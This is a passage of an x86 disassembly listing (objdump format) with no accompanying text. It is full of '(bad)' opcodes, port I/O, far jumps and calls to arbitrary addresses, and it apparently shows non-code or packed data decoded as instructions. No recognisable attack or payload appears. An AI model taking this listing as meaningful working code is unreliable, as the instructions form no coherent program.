  4019cc:	cmp    bl,BYTE PTR [ecx-0xf]
  4019cf:	neg    BYTE PTR [eax+esi*1-0x5e]
  4019d3:	stc    
  4019d4:	loop   0x4019f0
  4019d6:	add    BYTE PTR [ebp-0x6e],bh
  4019d9:	xchg   ecx,eax
  4019da:	xor    BYTE PTR [esi-0x21],ch
  4019dd:	jmp    0xe04e69e1
  4019e2:	inc    ecx
  4019e3:	(bad)  
  4019e4:	enter  0xd4c8,0xb7
  4019e8:	data16 cmp ah,al
  4019eb:	(bad)  
  4019ec:	xor    DWORD PTR [ecx],edi
  4019ee:	bound  esp,QWORD PTR [esi+0x2d]
  4019f1:	shl    DWORD PTR [edx+0x62],0x47
  4019f5:	inc    esi
  4019f6:	aaa    
  4019f7:	mov    edi,0x94709f9f
  4019fc:	or     dh,BYTE PTR [eax+0x3057090a]
  401a02:	inc    esp
  401a03:	adc    BYTE PTR [eax],ch
  401a05:	pusha  
  401a06:	xor    bl,BYTE PTR [edi+0x73]
  401a09:	dec    esp
  401a0a:	mov    ebx,0x302ecc11
  401a0f:	ret    0xbad
  401a12:	cmp    al,0xb4
  401a14:	aas    
  401a15:	adc    eax,0x669aed5d
  401a1a:	stos   DWORD PTR es:[edi],eax
  401a1b:	push   DWORD PTR [edx]
  401a1d:	std    
  401a1e:	int3   
  401a1f:	lods   eax,DWORD PTR ds:[esi]
  401a20:	scas   eax,DWORD PTR es:[edi]
  401a21:	mov    edx,DWORD PTR [ecx+edi*1-0x74]
  401a25:	cmp    esp,DWORD PTR [esi+0x26]
  401a28:	lods   eax,DWORD PTR ds:[esi]
  401a29:	pop    eax
  401a2a:	push   ecx
  401a2b:	out    dx,al
  401a2c:	mov    ebx,0xfd81a757
  401a31:	bound  edi,QWORD PTR [edx+edx*1+0x51a4b730]
  401a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a39:	dec    eax
  401a3a:	xor    cl,ch
  401a3c:	test   eax,0xccff0a90
  401a41:	and    DWORD PTR [edx+0x7b97f832],esp
  401a47:	mov    ebx,0x3ae62d1a
  401a4c:	ror    edx,cl
  401a4e:	fsub   DWORD PTR [eax+0x6b]
  401a51:	test   BYTE PTR [eax+0x78],cl
  401a54:	pusha  
  401a55:	loope  0x4019e1
  401a57:	ins    DWORD PTR es:[edi],dx
  401a58:	mov    al,ds:0x817b34c3
  401a5d:	inc    esp
  401a5e:	xchg   ecx,eax
  401a5f:	push   cs
  401a60:	pop    eax
  401a61:	repz (bad) 
  401a63:	mul    DWORD PTR [esi]
  401a65:	and    dh,BYTE PTR [edi]
  401a67:	ins    BYTE PTR es:[edi],dx
  401a68:	jmp    0x4f01:0x18e3025e
  401a6f:	sub    al,0x4e
  401a71:	inc    ebp
  401a72:	ss in  al,dx
  401a74:	adc    BYTE PTR [ebx+0x5d],ah
  401a77:	in     al,0x46
  401a79:	ffreep st(4)
  401a7b:	xor    eax,0x79631475
  401a80:	pop    edi
  401a81:	loop   0x401a0d
  401a83:	pop    edi
  401a84:	jno    0x401aa1
  401a86:	out    0x39,al
  401a88:	retf   
  401a89:	xor    esp,DWORD PTR [esp+eax*1-0x70be8b31]
  401a90:	test   al,0x41
  401a92:	mov    al,0x2d
  401a94:	call   DWORD PTR [ebx]
  401a96:	out    0xb1,eax
  401a98:	dec    ebx
  401a99:	adc    bh,bl
  401a9b:	jmp    0x401b15
  401a9d:	jns    0x401a55
  401a9f:	or     cl,BYTE PTR [ecx-0x57756cfa]
  401aa5:	sub    ebp,0x901dcd47
  401aab:	push   edi
  401aac:	pop    ss
  401aad:	cmc    
  401aae:	nop
  401aaf:	mov    dh,BYTE PTR [esi]
  401ab1:	clc    
  401ab2:	jg     0x401b22
  401ab4:	int3   
  401ab5:	xchg   edi,eax
  401ab6:	loope  0x401a73
  401ab8:	fidiv  WORD PTR [eax]
  401aba:	pop    esi
  401abb:	push   esi
  401abc:	test   al,0xaf
  401abe:	mov    WORD PTR [ebx],ss
  401ac0:	das    
  401ac1:	jo     0x401ae6
  401ac3:	push   esp
  401ac4:	push   cs
  401ac5:	aas    
  401ac6:	pop    ss
  401ac7:	cmp    esi,ecx
  401ac9:	jmp    0x9f2e:0x1733bb38
  401ad0:	pusha  
  401ad1:	test   al,0x96
  401ad3:	test   eax,0x4a2a9c82
  401ad8:	inc    edx
  401ad9:	rcr    ch,0xde
  401adc:	push   0xedd6d33
  401ae1:	fimul  DWORD PTR [ebp+edx*8+0x15599b8a]
  401ae8:	aas    
  401ae9:	and    BYTE PTR [eax],cl
  401aeb:	fs pop esi
  401aed:	bound  edx,QWORD PTR [edi+0x5d6db0e8]
  401af3:	test   BYTE PTR [esp+esi*4-0x45],0xfa
  401af8:	pop    edi
  401af9:	dec    ebx
  401afa:	aad    0xee
  401afc:	aas    
  401afd:	(bad)  
  401afe:	cmp    BYTE PTR [edi+esi*8-0x6e0e53a7],dh
  401b05:	test   al,0x35
  401b07:	inc    edx
  401b08:	test   eax,0x839653c5
  401b0d:	fnstcw WORD PTR [esi-0x13]
  401b10:	test   eax,edi
  401b12:	adc    DWORD PTR [ebx-0x1f],ebx
  401b15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b16:	dec    ecx
  401b17:	aam    0x2f
  401b19:	mov    al,ds:0x17bd4b65
  401b1e:	and    BYTE PTR [ebp-0x7a],dl
  401b21:	(bad)  
  401b22:	adc    ebx,ebx
  401b24:	add    BYTE PTR [ebx],ah
  401b26:	shr    DWORD PTR [esi],cl
  401b28:	dec    ebx
  401b29:	jl     0x401b9d
  401b2b:	mov    ecx,0xc3173aac
  401b30:	imul   ecx,DWORD PTR [ebx+edx*2],0x70
  401b34:	ret    
  401b35:	mov    dl,0x5
  401b37:	in     al,dx
  401b38:	mov    ebp,0x7f8664b7
  401b3d:	xchg   esi,eax
  401b3e:	in     eax,dx
  401b3f:	push   ebp
  401b40:	out    dx,al
  401b41:	add    eax,0x1502b19b
  401b46:	inc    edx
  401b47:	sbb    eax,0xe1f46cf5
  401b4c:	push   cs
  401b4d:	aaa    
  401b4e:	cmp    ebp,DWORD PTR [ecx-0x3003f096]
  401b54:	stc    
  401b55:	jae    0x401b9e
  401b57:	dec    eax
  401b58:	inc    ecx
  401b59:	xor    DWORD PTR [esi-0x2],ebx
  401b5c:	imul   esi,DWORD PTR [ebp-0x35],0xffffff86
  401b60:	jo     0x401b45
  401b62:	jcxz   0x401bc0
  401b65:	sub    BYTE PTR [ecx],cl
  401b67:	add    BYTE PTR [ebx-0x2c],cl
  401b6a:	ret    
  401b6b:	push   cs
  401b6c:	and    cl,ah
  401b6e:	test   DWORD PTR [edx-0x3f],esi
  401b71:	aas    
  401b72:	arpl   WORD PTR [ebp+0x3df6e7f],sp
  401b78:	adc    cl,BYTE PTR [eax]
  401b7a:	in     eax,dx
  401b7b:	ja     0x401b6d
  401b7d:	push   edx
  401b7e:	cmp    ebx,DWORD PTR [ebx]
  401b80:	fcmovbe st,st(0)
  401b82:	rol    DWORD PTR [edi+0x37],1
  401b85:	pop    ss
  401b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b87:	(bad)  
  401b88:	sub    BYTE PTR [esi+0x14],dl
  401b8b:	mov    BYTE PTR [edi+eax*2],ch
  401b8e:	pop    es
  401b8f:	xor    BYTE PTR [edx-0x1752698d],ah
  401b95:	sub    eax,0x47abe366
  401b9a:	push   ebp
  401b9b:	adc    al,0xa5
  401b9d:	jg     0x401be4
  401b9f:	repnz dec esp
  401ba1:	and    DWORD PTR ds:0x3e8977c,edi
  401ba7:	ins    DWORD PTR es:[edi],dx
  401ba8:	or     eax,0xc8965d18
  401bad:	sub    cl,ch
  401baf:	jae    0x401b3f
  401bb1:	icebp  
  401bb2:	sub    cl,BYTE PTR [edi+0x1f837775]
  401bb8:	dec    eax
  401bb9:	adc    DWORD PTR [ebx+0x41],ebp
  401bbc:	sbb    esi,DWORD PTR [edx+0x6e]
  401bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bc0:	(bad)  
  401bc2:	mov    ah,BYTE PTR [eax+0x57]
  401bc5:	fs add al,0xe7
  401bc8:	add    DWORD PTR [ebp+0x2b554e85],ecx
  401bce:	push   ds
  401bcf:	sub    eax,0x98bbd2cf
  401bd4:	mov    bl,0x2
  401bd6:	ret    
  401bd7:	sbb    dh,BYTE PTR [ecx+0x43ce3ed1]
  401bdd:	adc    DWORD PTR [eax-0x3e],esi
  401be0:	cdq    
  401be1:	leave  
  401be2:	push   eax
  401be3:	dec    ebp
  401be4:	fdivr  st(0),st
  401be6:	jl     0x401c06
  401be8:	mov    esi,0x88908ef0
  401bed:	enter  0x6c42,0x44
  401bf1:	cli    
  401bf2:	sbb    BYTE PTR [ebx-0x556fd4fa],dh
  401bf8:	leave  
  401bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bfa:	add    ebp,edx
  401bfc:	shl    BYTE PTR ss:[edi],cl
  401bff:	sub    al,0x9
  401c01:	enter  0x8b3d,0x51
  401c05:	fcomp  DWORD PTR [ebx]
  401c07:	adc    dh,ah
  401c09:	icebp  
  401c0a:	ja     0x401c1d
  401c0c:	not    DWORD PTR [edi-0x47]
  401c0f:	adc    DWORD PTR [edx-0x12],ecx
  401c12:	xchg   edi,eax
  401c13:	cdq    
  401c14:	js     0x401c36
  401c16:	pushf  
  401c17:	adc    DWORD PTR [ebp-0x76],esp
  401c1a:	mov    bh,ch
  401c1c:	pushf  
  401c1d:	pusha  
  401c1e:	and    DWORD PTR [ebx-0x61],0xbb01840a
  401c25:	aaa    
  401c26:	shr    al,1
  401c28:	cmp    ecx,eax
  401c2a:	jle    0x401c25
  401c2c:	std    
  401c2d:	dec    edx
  401c2e:	ins    DWORD PTR es:[edi],dx
  401c2f:	mov    dl,0x7
  401c31:	mov    edi,0x18209726
  401c36:	loopne 0x401bc1
  401c38:	lea    ebx,[edi+0x5d]
  401c3b:	fsubrp st(0),st
  401c3d:	cmp    ch,BYTE PTR ds:0x580588a9
  401c43:	xor    ebp,DWORD PTR [edx-0x2c]
  401c46:	pop    ecx
  401c47:	(bad)  
  401c48:	repz cmc 
  401c4a:	nop
  401c4b:	mov    esi,0x1ba8364d
  401c50:	in     eax,0x26
  401c52:	test   eax,0xeb85a8ed
  401c57:	xchg   ebp,eax
  401c58:	xchg   BYTE PTR [ebx],bh
  401c5a:	cmp    al,0xe1
  401c5c:	(bad)  
  401c5e:	cs push cs
  401c60:	adc    al,BYTE PTR [ebx-0x2]
  401c63:	or     eax,0xca73f586
  401c68:	add    BYTE PTR [edx-0x3a],dh
  401c6b:	lds    edx,FWORD PTR ds:0x2a1cd9d4
  401c71:	pop    ebp
  401c72:	and    ah,al
  401c74:	fdivr  QWORD PTR [esi-0x1ad2a7f1]
  401c7a:	daa    
  401c7b:	fld    TBYTE PTR [ebx+0x31]
  401c7e:	repz vaddss xmm6,xmm6,xmm1
  401c83:	popa   
  401c84:	sub    dl,ah
  401c86:	(bad)  
  401c87:	in     al,0x88
  401c89:	sbb    al,0x2a
  401c8b:	pop    esi
  401c8c:	loop   0x401c3c
  401c8e:	stos   BYTE PTR es:[edi],al
  401c8f:	jno    0x401c18
  401c91:	jecxz  0x401cc5
  401c93:	pop    eax
  401c94:	(bad)  
  401c95:	inc    ch
  401c97:	or     bh,0x81
  401c9a:	mov    edx,0x8ad66286
  401c9f:	shl    esp,0xc4
  401ca2:	jmp    0x401c43
  401ca4:	paddsb mm3,QWORD PTR [edx+0x67]
  401ca8:	mov    bl,0xa9
  401caa:	shl    DWORD PTR [edi+0x50],0x7e
  401cae:	push   eax
  401caf:	out    0x4e,eax
  401cb1:	(bad)  [esi]
  401cb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cb4:	jne    0x401cd8
  401cb6:	mov    esp,DWORD PTR [edx+edi*1]
  401cb9:	mul    DWORD PTR [ebp-0x34]
  401cbc:	push   esi
  401cbd:	cli    
  401cbe:	or     eax,0xfa08e365
  401cc3:	add    dh,BYTE PTR [ecx]
  401cc5:	mov    WORD PTR [edi],gs
  401cc7:	sub    al,0x66
  401cc9:	fstp   TBYTE PTR ss:[esi-0x9e48c37]
  401cd0:	sub    BYTE PTR [esi+ebx*8+0x1e],bh
  401cd4:	jecxz  0x401c5d
  401cd6:	lods   eax,DWORD PTR ds:[esi]
  401cd7:	das    
  401cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd9:	sbb    BYTE PTR [ecx-0xd],bl
  401cdc:	jecxz  0x401c69
  401cde:	jbe    0x401cc3
  401ce0:	dec    edx
  401ce1:	jae    0x401cab
  401ce3:	pop    es
  401ce4:	xchg   esi,eax
  401ce5:	sahf   
  401ce6:	mov    ds:0x49e402dd,al
  401ceb:	adc    DWORD PTR [edx+0x4e],eax
  401cee:	mov    bl,BYTE PTR [edi-0x15]
  401cf1:	ret    0xe939
  401cf4:	or     DWORD PTR [esi+0x46103b8b],edx
  401cfa:	jns    0x401d63
  401cfc:	out    0xc8,eax
  401cfe:	rcr    ebx,0x5a
  401d01:	fs jo  0x401ca8
  401d04:	fdivr  st(0),st
  401d06:	add    dh,ch
  401d08:	imul   edi,DWORD PTR [ebp+ecx*4-0x561aa41b],0xfbee1253
  401d13:	inc    edx
  401d14:	test   DWORD PTR [ebp+ebx*1+0x2d],ebx
  401d18:	mov    dh,0xb1
  401d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d1b:	xor    ch,BYTE PTR [edi]
  401d1d:	ret    
  401d1e:	or     eax,0x41bc77a5
  401d23:	xchg   esi,eax
  401d24:	jmp    0xdd1a0b0e
  401d29:	mov    ds,edx
  401d2b:	mov    WORD PTR [ecx-0x7f1ef91d],cs
  401d31:	mov    eax,ds:0x2f159c36
  401d36:	dec    edi
  401d37:	pop    es
  401d38:	int    0xbe
  401d3a:	inc    esi
  401d3b:	push   ds
  401d3c:	adc    esp,0xffffffc3
  401d3f:	inc    ecx
  401d40:	test   edx,esi
  401d42:	pop    ss
  401d43:	push   DWORD PTR [eax+0x3de41368]
  401d49:	jle    0x401ceb
  401d4b:	sahf   
  401d4c:	mov    dl,0x9
  401d4e:	and    eax,0x19afda43
  401d53:	mov    bh,0x73
  401d55:	jmp    0x401da2
  401d57:	xchg   eax,edi
  401d59:	aam    0x75
  401d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d5c:	rcr    esi,0x52
  401d5f:	imul   ecx,DWORD PTR [esp+ebp*8+0x2c7acafd],0x37
  401d67:	mov    ebp,0x8c674374
  401d6c:	sbb    eax,DWORD PTR [esi]
  401d6e:	xchg   ebp,ecx
  401d70:	sahf   
  401d71:	lods   al,BYTE PTR ds:[esi]
  401d72:	rcr    DWORD PTR [eax],cl
  401d74:	int3   
  401d75:	jns    0x401d0f
  401d77:	out    dx,eax
  401d78:	push   0x7b8683ec
  401d7d:	stos   DWORD PTR es:[edi],eax
  401d7e:	mov    edi,ebx
  401d80:	sahf   
  401d81:	imul   ecx,esi,0x7f7531b4
  401d87:	leave  
  401d88:	lods   al,BYTE PTR ds:[esi]
  401d89:	jno    0x401dca
  401d8b:	mov    dl,bh
  401d8d:	xor    DWORD PTR [edi+0x7b],esi
  401d90:	jl     0x401d53
  401d92:	push   0x6cf66a60
  401d97:	call   0x80657893
  401d9c:	sahf   
  401d9d:	sti    
  401d9e:	add    al,0xdf
  401da0:	dec    ebp
  401da1:	pop    ebp
  401da2:	repnz out 0xb8,eax
  401da5:	shl    BYTE PTR [ebx-0x1d],1
  401da8:	mov    bl,0x1c
  401daa:	cli    
  401dab:	imul   eax,ebx,0xa
  401dae:	jle    0x401e2e
  401db0:	scas   eax,DWORD PTR es:[edi]
  401db1:	or     edi,DWORD PTR es:[eax+esi*8-0x42]
  401db6:	call   0x618fe0a3
  401dbb:	cdq    
  401dbc:	imul   ecx,DWORD PTR [eax],0x419a8949
  401dc2:	ss inc edi
  401dc4:	inc    esi
  401dc5:	inc    edi
  401dc6:	inc    edx
  401dc7:	pop    edx
  401dc8:	adc    ebp,edx
  401dca:	adc    edx,DWORD PTR [ebp+0x69835240]
  401dd0:	pop    ss
  401dd1:	fld    QWORD PTR ds:0xa2c57c7b
  401dd7:	sub    dh,BYTE PTR [ebx+0xac1a3f6]
  401ddd:	pop    edi
  401dde:	xor    ecx,DWORD PTR [ecx-0x7b]
  401de1:	cmp    al,0xa5
  401de3:	call   0x13d95f65
  401de8:	mov    ah,0x4e
  401dea:	out    0x35,eax
  401dec:	mov    esi,0xeb86d0ad
  401df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401df2:	stos   BYTE PTR es:[edi],al
  401df3:	jle    0x401e39
  401df5:	push   ds
  401df6:	xor    cl,al
  401df8:	cli    
  401df9:	loopne 0x401d88
  401dfb:	dec    esp
  401dfc:	scas   al,BYTE PTR es:[edi]
  401dfd:	clc    
  401dfe:	shr    DWORD PTR [ecx-0x42],0xd3
  401e02:	or     eax,0x86907c0b
  401e07:	in     eax,0x7a
  401e09:	imul   edx,DWORD PTR [ecx+0x48],0x33d6c47a
  401e10:	push   edi
  401e11:	stc    
  401e12:	jns    0x401e76
  401e14:	call   0x766bd378
  401e19:	lea    edi,[esi]
  401e1b:	call   DWORD PTR [edx-0x6f]
  401e1e:	push   0xac27c721
  401e23:	xor    bh,BYTE PTR [edx+0x76]
  401e26:	adc    BYTE PTR es:0x2292bf9c,ch
  401e2d:	inc    edx
  401e2e:	aaa    
  401e2f:	data16 sub BYTE PTR [ebp+0xc],bl
  401e33:	fist   DWORD PTR [esi-0x35]
  401e36:	retf   
  401e37:	add    eax,0x7ff7f2de
  401e3c:	mov    bl,0x50
  401e3e:	sbb    BYTE PTR [eax+0x4a],ch
  401e41:	xor    eax,DWORD PTR [ecx+0x5b]
  401e44:	sub    al,0x6f
  401e46:	ffreep st(0)
  401e48:	retf   0x5b0c
  401e4b:	push   ds
  401e4c:	rcl    BYTE PTR [edx+0x3],cl
  401e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e50:	pcmpeqb mm4,QWORD PTR [edi+0x78]
  401e54:	cli    
  401e55:	je     0x401ea9
  401e57:	adc    esi,DWORD PTR [eax+0x6c8b2d0e]
  401e5d:	pushf  
  401e5e:	imul   BYTE PTR [ecx-0x40]
  401e61:	jp     0x401e5d
  401e63:	imul   ebx,DWORD PTR [edi+ebx*4+0x7883142f],0x56
  401e6b:	mov    ebx,0x9917768d
  401e70:	cmp    DWORD PTR [esi+0x6d6c986b],esi
  401e76:	dec    eax
  401e77:	lds    ebp,FWORD PTR [edi]
  401e79:	xchg   esi,eax
  401e7a:	cmp    DWORD PTR [esi-0x720251f5],edi
  401e80:	push   0xffffffc3
  401e82:	addr16 fwait
  401e84:	in     al,dx
  401e85:	mov    DWORD PTR [esi],ebp
  401e87:	(bad)  
  401e88:	mov    WORD PTR [ebx+ecx*8],cs
  401e8b:	pop    esi
  401e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e8d:	xor    DWORD PTR [edi],ebx
  401e8f:	cmp    al,0x4
  401e91:	inc    ebp
  401e92:	jae    0x401e2a
  401e94:	gs aad 0x54
  401e97:	or     al,0x4
  401e99:	push   ebx
  401e9a:	lea    ebp,ds:0x83363906
  401ea0:	test   BYTE PTR [eax],0x26
  401ea3:	(bad)  
  401ea4:	push   esi
  401ea5:	jle    0x401f00
  401ea7:	inc    esp
  401ea8:	xchg   BYTE PTR [edx+0x1475ec0c],bl
  401eae:	or     bh,ch
  401eb0:	retf   0x3e77
  401eb3:	icebp  
  401eb4:	das    
  401eb5:	pop    ss
  401eb6:	sub    ch,BYTE PTR [ebp-0x6a]
  401eb9:	sbb    BYTE PTR [edx+0x31],0x3b
  401ebd:	pop    esp
  401ebe:	imul   ecx,DWORD PTR [ebx+0x26913adc],0xffffff84
  401ec5:	or     bh,BYTE PTR [ebp+0xa]
  401ec8:	dec    esi
  401ec9:	adc    al,0x28
  401ecb:	cwde   
  401ecc:	mov    WORD PTR [ecx-0x4f],ss
  401ecf:	add    DWORD PTR [esi+0x6d],edx
  401ed2:	aaa    
  401ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ed4:	mov    cl,0x68
  401ed6:	add    ebp,ebp
  401ed8:	jnp    0x401f4a
  401eda:	rol    al,1
  401edc:	xchg   BYTE PTR [ecx+0x69],bl
  401edf:	inc    ebp
  401ee0:	mov    ds:0x4fdeca71,al
  401ee5:	ficomp DWORD PTR [eax-0x523b92ab]
  401eeb:	xor    BYTE PTR [ebx+0x67],al
  401eee:	ins    BYTE PTR es:[edi],dx
  401eef:	(bad)  
  401ef0:	imul   ecx,ecx,0x15
  401ef3:	loope  0x401efb
  401ef5:	dec    edx
  401ef6:	(bad)  
  401ef7:	xchg   esi,eax
  401ef8:	inc    esi
  401ef9:	gs repz cmp cl,ah
  401efd:	xchg   esi,eax
  401efe:	jmp    0xc1bf58ce
  401f03:	mov    ah,0xec
  401f05:	pop    esp
  401f06:	out    0x91,eax
  401f08:	(bad)  
  401f09:	pop    esi
  401f0a:	dec    esp
  401f0b:	mov    edx,0xc4d0243c
  401f10:	push   edx
  401f11:	sahf   
  401f12:	or     edx,DWORD PTR [edx]
  401f14:	pop    esi
  401f15:	aas    
  401f16:	mov    eax,0xd8a29cfe
  401f1b:	sub    BYTE PTR [edx-0x6a5c1c18],ah
  401f21:	int    0x3a
  401f23:	pop    edx
  401f24:	jne    0x401eff
  401f26:	sub    DWORD PTR [eax-0x7b13d166],esi
  401f2c:	mul    BYTE PTR [edi]
  401f2e:	call   0x53b3a54f
  401f33:	cli    
  401f34:	ss jp  0x401ee6
  401f37:	xchg   esp,esp
  401f39:	fdivr  st,st(4)
  401f3b:	mov    al,0x19
  401f3d:	rol    DWORD PTR [esi-0x72ea42b0],cl
  401f43:	jle    0x401ed8
  401f45:	fild   WORD PTR [ebp-0x182153ed]
  401f4b:	sub    dh,ah
  401f4d:	fsub   QWORD PTR [ecx+ecx*1]
  401f50:	inc    esp
  401f51:	jbe    0x401fb5
  401f53:	sbb    DWORD PTR [eax+0x64],eax
  401f56:	pop    ebp
  401f57:	fist   DWORD PTR [edi]
  401f59:	jbe    0x401fcf
  401f5b:	and    edi,DWORD PTR [ecx+0xcf3e1ad]
  401f61:	xchg   ecx,eax
  401f62:	loope  0x401fab
  401f64:	rcl    DWORD PTR [ecx+0x1e],0xef
  401f68:	xor    ebp,DWORD PTR [ecx+0x56]
  401f6b:	mov    bl,0x7b
  401f6d:	repz cmc 
  401f6f:	clc    
  401f70:	inc    ebp
  401f71:	cmc    
  401f72:	repnz push ebp
  401f74:	adc    eax,0xf18598f9
  401f79:	dec    ebp
  401f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f7b:	hlt    
  401f7c:	push   cs
  401f7d:	jmp    0x401f91
  401f7f:	pusha  
  401f80:	jp     0x402001
  401f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f83:	cwde   
  401f84:	(bad)  
  401f85:	loopne 0x401f31
  401f87:	(bad)  
  401f89:	clc    
  401f8a:	sub    DWORD PTR [ecx],esi
  401f8c:	and    BYTE PTR [ebp-0x2f],ah
  401f8f:	cld    
  401f90:	stc    
  401f91:	jne    0x401f36
  401f93:	hlt    
  401f94:	ss jp  0x401f95
  401f97:	pop    ss
  401f98:	cmp    BYTE PTR [esi+0x32ee7e1],cl
  401f9e:	sub    ah,BYTE PTR [edx-0x7e97e542]
  401fa4:	aas    
  401fa5:	inc    esp
  401fa6:	mov    esp,0xcf0f5945
  401fab:	aam    0xe7
  401fad:	jge    0x401f2f
  401faf:	dec    ebp
  401fb0:	lods   eax,DWORD PTR ds:[esi]
  401fb1:	ret    0xb975
  401fb4:	pop    ecx
  401fb5:	daa    
  401fb6:	adc    DWORD PTR gs:[esi-0xfbb0343],edx
  401fbd:	call   0x3837bc7d
  401fc2:	les    eax,FWORD PTR [ebp*8+0x65fcea7c]
  401fc9:	call   0x67614e02
  401fce:	and    ch,dl
  401fd0:	mov    edi,0xa8b94fb3
  401fd5:	mov    ds:0xe97cae1,al
  401fda:	iret   
  401fdb:	mov    esi,0x101af48e
  401fe0:	inc    ebp
  401fe1:	inc    eax
  401fe2:	js     0x401fa6
  401fe4:	stc    
  401fe5:	push   ebx
  401fe6:	jne    0x401f7b
  401fe8:	cmp    al,0x7a
  401fea:	push   edi
  401feb:	std    
  401fec:	adc    edi,edi
  401fee:	std    
  401fef:	call   DWORD PTR [esi]
  401ff1:	pop    ebx
  401ff2:	push   ss
  401ff3:	retf   
  401ff4:	daa    
  401ff5:	or     ecx,ebp
  401ff7:	jno    0x401f7c
  401ff9:	adc    DWORD PTR [eax-0x605b032b],0x26
  402000:	das    
  402001:	cwde   
  402002:	push   ecx
  402003:	jmp    0x46b77797
  402008:	shl    BYTE PTR [ebx+0x7fb7a861],1
  40200e:	lds    eax,FWORD PTR [edi+0x5d]
  402011:	mov    esi,fs
  402013:	leave  
  402014:	arpl   si,bx
  402016:	inc    esp
  402017:	scas   al,BYTE PTR es:[edi]
  402018:	daa    
  402019:	ja     0x40200b
  40201b:	add    eax,DWORD PTR ds:0x9642
  402020:	popf   
  402021:	pop    DWORD PTR [ebx+0x73]
  402024:	out    0xaa,eax
  402026:	xchg   edi,eax
  402027:	inc    edi
  402028:	inc    eax
  402029:	shl    esp,1
  40202b:	(bad)  
  40202c:	cmp    esi,DWORD PTR [ebp-0x54b3ba57]
  402032:	dec    edx
  402033:	push   eax
  402034:	lods   eax,DWORD PTR ds:[esi]
  402035:	xchg   ebp,eax
  402036:	js     0x40205f
  402038:	sbb    BYTE PTR [ecx+edx*1+0x278608bb],dh
  40203f:	lock sbb al,0x48
  402042:	pushf  
  402043:	out    dx,al
  402044:	fmul   QWORD PTR [ebx-0x21230e03]
  40204a:	sub    ch,BYTE PTR [ecx+ebp*8]
  40204d:	xchg   ecx,eax
  40204e:	inc    ecx
  40204f:	rcl    edi,0xd7
  402052:	sub    al,0xdc
  402054:	out    0x5d,eax
  402056:	push   0xffffffba
  402058:	jmp    0xbf7cff3f
  40205d:	add    ebx,DWORD PTR [edi]
  40205f:	mov    edi,0xa211d1b7
  402064:	mov    cx,0x9957
  402068:	int    0xf1
  40206a:	not    DWORD PTR [ecx+0x59]
  40206d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40206e:	push   esi
  40206f:	pop    edx
  402070:	add    DWORD PTR [edi+edi*1-0x40],esi
  402074:	call   0x9879ea5
  402079:	mov    gs,WORD PTR [ebp+0x19045ffa]
  40207f:	pop    esp
  402080:	in     eax,dx
  402081:	loopne 0x40206d
  402083:	int    0x7f
  402085:	xchg   esi,eax
  402086:	(bad)  
  402088:	inc    eax
  402089:	mov    esi,0x2e760c95
  40208e:	out    dx,eax
  40208f:	div    BYTE PTR [ecx+ecx*1+0x5ba3c71f]
  402096:	fwait
  402097:	xor    eax,0x59a023e0
  40209c:	pop    edx
  40209d:	ret    
  40209e:	bnd ja 0x4020ef
  4020a1:	pushf  
  4020a2:	mov    ds:0x71848f42,al
  4020a7:	pop    ecx
  4020a8:	or     bl,BYTE PTR [ecx]
  4020aa:	icebp  
  4020ab:	scas   al,BYTE PTR es:[edi]
  4020ac:	lds    edx,FWORD PTR [ecx-0xf]
  4020af:	dec    ebp
  4020b0:	or     BYTE PTR [esi],cl
  4020b2:	int3   
  4020b3:	xor    BYTE PTR [eax+0x75],dl
  4020b6:	pop    ds
  4020b7:	push   eax
  4020b8:	inc    esp
  4020b9:	pop    esi
  4020ba:	push   ebp
  4020bb:	and    ecx,0xa1b0e7f7
  4020c1:	jge    0x402060
  4020c3:	and    DWORD PTR [eax+0x7c09656e],eax
  4020c9:	les    eax,FWORD PTR [edx]
  4020cb:	cmp    BYTE PTR [esi+edx*2+0x4b],dh
  4020cf:	sbb    al,0x8
  4020d1:	sub    eax,0x80a1de5
  4020d6:	je     0x402144
  4020d8:	in     al,0x65
  4020da:	xchg   BYTE PTR [ebp-0x41],cl
  4020dd:	xor    DWORD PTR [eax-0x44],ebp
  4020e0:	push   esp
  4020e1:	mov    fs,WORD PTR [edx-0x4c]
  4020e4:	mov    ch,BYTE PTR [ebx+0x71]
  4020e7:	mov    al,ds:0xdc81a853
  4020ec:	xlat   BYTE PTR ss:[ebx]
  4020ee:	mov    ebx,0x10521144
  4020f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020f4:	test   al,0x18
  4020f6:	test   eax,0xd387a51e
  4020fb:	mov    esi,0xbc9ff0dc
  402100:	mul    BYTE PTR [ecx+0x57]
  402103:	sub    eax,0x7b6b2cef
  402108:	mov    esi,0x5179baf1
  40210d:	mov    esi,0xf63a5edc
  402112:	mov    edi,0x39654079
  402117:	aam    0x86
  402119:	mov    ah,bl
  40211b:	pop    esp
  40211c:	das    
  40211d:	mov    al,0xb7
  40211f:	adc    BYTE PTR [esi],0x9b
  402122:	jge    0x402170
  402124:	add    edi,DWORD PTR [ebp-0x63ec1f75]
  40212a:	(bad)  
  40212b:	sub    ah,BYTE PTR [ecx+0x2b]
  40212e:	or     BYTE PTR [edx],bh
  402130:	mov    esi,0xb21957ea
  402135:	rep outs dx,BYTE PTR ds:[esi]
  402137:	imul   esp,DWORD PTR [esi-0x2001d6db],0x19
  40213e:	int3   
  40213f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402141:	nop
  402142:	fcmovne st,st(7)
  402144:	pop    ecx
  402145:	sbb    esp,DWORD PTR [esi-0x76]
  402148:	pop    ebp
  402149:	push   ss
